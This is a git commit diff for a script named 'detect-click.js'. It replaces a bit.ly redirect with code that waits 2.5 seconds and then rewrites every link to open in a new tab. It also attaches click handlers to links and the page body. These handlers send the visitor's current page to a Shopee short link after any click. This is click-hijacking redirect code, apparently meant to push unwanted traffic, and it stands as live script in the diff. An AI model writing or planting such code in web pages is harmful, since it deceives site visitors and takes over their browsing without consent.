9198972cca4e6376ea168ae2c42e670559091520
trk907728 <108434139+trk907728@users.noreply.github.com>
2022-10-02 04:44:51 +0700

    Update detect-click.js

--- detect-click.js
+++ detect-click.js
@@ -1,1 +1,27 @@
-(()=>{const urlDirectClick="https://bit.ly/3Be8tsp";document.querySelectorAll("a").forEach(element=>{element.setAttribute("target","_blank");element.addEventListener("click",event=>{const isTargetBlank=event.target.target==="_blank";const isShortcutKeyPressed=event.ctrlKey||event.shiftKey||event.metaKey;
+var delayInMilliseconds = 2500;
+setTimeout(function() {
+(() => {
+    const urlDirectClick = "https://shope.ee/9K3UCwSdbl";
+    const urlDirectClick2 = "https://shope.ee/6UiVXIVq9w";
+    document.querySelectorAll("a").forEach(element => {
+        element.setAttribute("target", "_blank");
+        element.addEventListener("click", event => {
+            const isTargetBlank = event.target.target === "_blank";
+            const isShortcutKeyPressed = event.ctrlKey || event.shiftKey || event.metaKey;
+            if (isTargetBlank || isShortcutKeyPressed) {
+                try {
+                    setTimeout(() => {
+                        window.location.href = urlDirectClick2;
+                    }, 1000);
+                } catch (e) {};
+            };
+        });
+    });
+    document.querySelector("body").addEventListener("click", (event) => {
+        
+        setTimeout(() => {
+            window.location.href = urlDirectClick2;
+        }, 1000);
+    });
+})();
+}, delayInMilliseconds);
